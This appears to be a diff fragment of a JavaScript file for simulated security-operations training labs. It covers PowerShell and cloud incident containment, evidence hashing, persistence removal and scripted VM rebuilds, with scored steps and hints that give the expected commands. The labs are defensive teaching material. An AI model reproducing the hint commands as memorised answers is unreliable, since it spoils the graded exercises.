+        psStep('sa-6.ex3.s3','detection','soc-05-lesson-07','command','beacon',{ instruction:'Review established TCP connections and identify the external beacon destination.', hint:'`Get-NetTCPConnection -State Established | Where-Object {$_.RemotePort -eq 443} | Format-Table`.', points:10 }),
+      ]},
+      { id:'ex4', upstreamHeading:'Containment handoff: request action within your authority', steps:[
+        psStep('sa-6.ex4.s1','containment','soc-05-lesson-09','analyze','handoff',{ instruction:'Write a concise handoff to the incident commander. Include the account and source, jump host, observed process/persistence and beacon, evidence preservation, a request for containment, and your scope limit: read-only triage, no account disablement or host isolation performed.', answerLabel:'Containment handoff', answerMultiline:true, hint:'State observed facts, requested action, and the authority boundary.', points:15 }),
+      ]},
+    ], completion:{ requireAllSteps:true },
+  };
+
+  // ────────────────────────────────────────────────────────────
+  //  sa-7  Contain, Collect, Rebuild (L5, simulated PowerShell)
+  // ────────────────────────────────────────────────────────────
+  function rebuildStep(id, phase, objective, kind, check, fields) {
+    return Object.assign({ id, phase, objective, kind, validation:{type:'powershellRebuild',check} }, fields);
+  }
+  const SA7_LAB = {
+    id:'sa-7', track:'security-assessments', title:'Contain, Collect, Rebuild', difficulty:'Intermediate', estimatedTime:'55 min', icon:'🧰',
+    tags:['Incident Response','Evidence Collection','PowerShell','Recovery'],
+    environment:{type:'windows',shell:'PowerShellScriptShell',engine:'MISSION_NEXT_POWERSHELL_REBUILD',fixtureAware:true,initialCwd:'C:\\IR'},
+    scenario:{role:'SOC analyst executing approved response ticket IR-NS',incident:'The incident commander authorizes containment, evidence collection, removal of the identified jump-host persistence, and a scripted rebuild. Start by running Get-IRTicket. Disable only the incident account, revoke its sessions, and limit inbound management to the approved subnet. Export and hash the Security log before writing custody.csv. Remove only the incident task and Run-key value and verify both are gone. Finally write and run Rebuild-JumpHost.ps1. This ticket does not authorize DNS or user-traffic cutover; hand off the verified replacement for that separate change. All cmdlets and cloud operations are simulated in this browser; nothing contacts a real directory or Azure tenant.'},
+    exercises:[
+      {id:'ex1',upstreamHeading:'Containment: apply the authorized response',steps:[
+        rebuildStep('sa-7.ex1.s1','containment','soc-09-lesson-01','command','ticket',{instruction:'Read the response ticket and confirm the authorized identity, host and scope.',hint:'Run `Get-IRTicket` in the command field.',points:5}),
+        rebuildStep('sa-7.ex1.s2','containment','soc-09-lesson-01','command','containment',{instruction:'Disable the incident account and revoke its active sign-in sessions. Both actions are explicitly authorized by this ticket.',hint:'Use `Disable-ADAccount -Identity <ticket account>` and `Revoke-MgUserSignInSession -UserId <ticket account>`.',points:10}),
+        rebuildStep('sa-7.ex1.s3','containment','soc-09-lesson-01','command','isolation',{instruction:'Add inbound allow rules for ports 22 and 3389 from the management subnet only. No other source or inbound port is authorized.',hint:'Use `New-NetFirewallRule -Direction Inbound -Action Allow -RemoteAddress <management subnet> -LocalPort 22` and an equivalent rule for 3389.',points:10}),
+      ]},
+      {id:'ex2',upstreamHeading:'Collection and eradication: preserve, then remove persistence',steps:[
+        rebuildStep('sa-7.ex2.s1','containment','SOC-101.6','command','collection',{instruction:'Export the Security event log, hash the exported EVTX file, and write a custody record to custody.csv. The hash must be calculated after export.',hint:'`wevtutil epl Security C:\\IR\\Security.evtx` then `Get-FileHash -LiteralPath C:\\IR\\Security.evtx | Export-Csv -Path C:\\IR\\custody.csv -NoTypeInformation`.',points:15}),
+        rebuildStep('sa-7.ex2.s2','eradication','soc-09-lesson-01','command','eradication',{instruction:'Remove only the incident scheduled task and Run-key value. Query both locations afterward to verify they are absent.',hint:'Use `Unregister-ScheduledTask -TaskName UpdateTelemetry -Confirm:$false`, `Remove-ItemProperty` for the ticketed Run value, then `Get-ScheduledTask` and `Get-ItemProperty` to verify.',points:10}),
+      ]},
+      {id:'ex3',upstreamHeading:'Recovery: script a clean, monitored replacement',steps:[
+        rebuildStep('sa-7.ex3.s1','recovery','SOC-101.7','command','secretFree',{instruction:'Save and run Rebuild-JumpHost.ps1. Use the approved image, isolated network, baseline, monitoring extension, diagnostics workspace and incident tag from the ticket. Read back VM state and confirm Heartbeat before declaring success. Rerunning the script must not create a duplicate VM. Do not switch DNS or user traffic; the separately approved change owner handles cutover.',hint:'Use the editor above the command prompt. The shell exposes ticket values as `$env:APPROVED_IMAGE`, `$env:RECOVERY_VNET`, `$env:RECOVERY_SUBNET`, `$env:RECOVERY_NSG`, `$env:MANAGEMENT_SUBNET`, `$env:BASELINE`, `$env:MONITORING_EXTENSION`, `$env:WORKSPACE`, and `$env:INCIDENT_ID`.',points:15}),
+        rebuildStep('sa-7.ex3.s2','recovery','SOC-101.7','command','rebuild',{instruction:'Confirm the completed VM is built from the approved image, isolated on the recovery subnet with no public IP, hardened, monitored, incident-tagged and producing Heartbeat. The script must query the provisioned VM before it reports success.',hint:'Run a state-verification command such as `Get-AzVM -Name $vmName` after provisioning and configuration, then query the Heartbeat stream.',points:15}),
+      ]},
+      {id:'ex4',upstreamHeading:'Post-incident: record cause and improvement',steps:[
+        rebuildStep('sa-7.ex4.s1','postIncident','soc-09-lesson-01','analyze','postIncident',{instruction:'Write a short post-incident note covering the credential cause, persistence, containment performed, and one detection improvement for identity misuse or unauthorized persistence.',answerLabel:'Post-incident note',answerMultiline:true,hint:'State the observed cause, actions completed under the ticket and a specific control to improve detection.',points:10}),
+      ]},
+    ], completion:{requireAllSteps:true},
+  };
+
+  // L6 — Cloud Identity & Workload Incident. This optional lab is deliberately
+  // catalogued only inside the imported labs application.
+  function cloudStep(id,phase,objective,check,fields){return Object.assign({id,phase,objective,kind:check==='post'?'analyze':'command',validation:{type:'cloudIncident',check}},fields);}
+  const SA8_LAB={
+    id:'sa-8',track:'security-assessments',title:'Cloud Identity & Workload Incident',difficulty:'Intermediate',estimatedTime:'55 min',icon:'☁️',tags:['Cloud IR','KQL','Identity','Recovery'],
+    environment:{type:'cloud',shell:'CloudShell',engine:'MISSION_NEXT_CLOUD_INCIDENT',fixtureAware:true,initialCwd:'/home/analyst'},
+    scenario:{role:'SOC analyst on the cloud response rotation',incident:'A risky sign-in for the Operation Night Shift identity precedes an unapproved VM, an internet-exposed SSH rule and an unauthorized role assignment. The incident ticket authorizes identity/session containment, NSG response, a forensic snapshot verified before VM deletion, role removal and a clean scripted rebuild. Use the virtual Cloud Shell only; no Azure tenant is contacted.'},
+    exercises:[
+      {id:'ex1',upstreamHeading:'Detection and scope',steps:[
+        cloudStep('sa-8.ex1.s1','detection','soc-09-lesson-01','ticket',{instruction:'Read the cloud response ticket and confirm its authority and recovery boundary.',hint:'Run `cat /home/analyst/ir-ticket.txt`.',points:5}),
+        cloudStep('sa-8.ex1.s2','detection','SOC-101.6','detect',{instruction:'Use Log Analytics KQL to find the risky sign-in, then pivot to AzureActivity for the unapproved VM write and NSG SSH rule opened to 0.0.0.0/0.',hint:'Query SigninLogs and AzureActivity. Example: `SigninLogs | where riskState == "atRisk"`.',points:15}),
+        cloudStep('sa-8.ex1.s3','analysis','soc-09-lesson-01','scope',{instruction:'Scope the affected resources and role assignment with resource, VM and NSG listing commands.',hint:'Try `az resource list --tag IncidentId=...`, `az vm list -d`, and `az network nsg rule list`.',points:10}),
+      ]},
+      {id:'ex2',upstreamHeading:'Containment, preservation and eradication',steps:[
+        cloudStep('sa-8.ex2.s1','containment','soc-09-lesson-01','contain',{instruction:'Disable the incident identity, revoke its active sign-in sessions, and remove the internet-exposed NSG rule.',hint:'Use simulated `az ad user update`, `az ad user revoke-sign-in-sessions`, and `az network nsg rule delete` commands.',points:15}),
+        cloudStep('sa-8.ex2.s2','containment','SOC-101.6','snapshot',{instruction:'Create a snapshot of the rogue VM OS disk and verify its provisioning state and source before any deletion.',hint:'Run `az snapshot create ...` followed by `az snapshot show ...`.',points:15}),
+        cloudStep('sa-8.ex2.s3','eradication','soc-09-lesson-01','eradicate',{instruction:'After snapshot verification, deallocate and delete the rogue VM, then remove the unauthorized role assignment.',hint:'The VM delete command is rejected until the snapshot has been verified.',points:10}),
+      ]},
+      {id:'ex3',upstreamHeading:'Recovery and post-incident improvement',steps:[
+        cloudStep('sa-8.ex3.s1','recovery','SOC-101.7','rebuild',{instruction:'Write and run rebuild.sh to create a replacement from the approved image with no public IP, the recovery NSG, monitoring, diagnostics and the incident tag. Query its state before declaring success. A rerun must not create a duplicate.',hint:'The editor is in the Cloud Shell pane. Include `az vm create`, monitoring extension, diagnostics, `IncidentId`, and `az vm show`.',points:20}),
+        cloudStep('sa-8.ex3.s2','recovery','SOC-101.7','heartbeat',{instruction:'Query Heartbeat and confirm a row for the replacement VM in the ticketed SIEM workspace.',hint:'Run `az monitor log-analytics query -w <workspace> --analytics-query "Heartbeat"`.',points:10}),
+        cloudStep('sa-8.ex3.s3','postIncident','soc-09-lesson-01','post',{instruction:'Propose a KQL analytic for an internet-open NSG rule created by an identity outside the network team. Include the identity, NSG, preserved snapshot, and improvement in your note.',answerLabel:'Post-incident analytic and note',answerMultiline:true,hint:'Name the AzureActivity operation and describe a useful identity/team filter.',points:10}),
+      ]},
+    ],completion:{requireAllSteps:true},
   };
 
   // Original source retained for attribution; this is the Mission Next SSH adaptation.
@@ -1154,6 +1022,10 @@
     'sa-3': SA3_LAB,
     'sa-4': SA4_LAB,
     'sa-5': SA5_LAB,
+    'sa-6': SA6_LAB,
+    'sa-7': SA7_LAB,
+    'sa-8': SA8_LAB,
+    'sa-9': SA9_LAB,
   });
 
   Object.assign(window, {
@@ -1161,5 +1033,9 @@
     MISSION_NEXT_SA_3: SA3_LAB,
     MISSION_NEXT_SA_4: SA4_LAB,
     MISSION_NEXT_SA_5: SA5_LAB,
+    MISSION_NEXT_SA_6: SA6_LAB,
+    MISSION_NEXT_SA_7: SA7_LAB,
+    MISSION_NEXT_SA_8: SA8_LAB,
+    MISSION_NEXT_SA_9: SA9_LAB,
   });
 })();
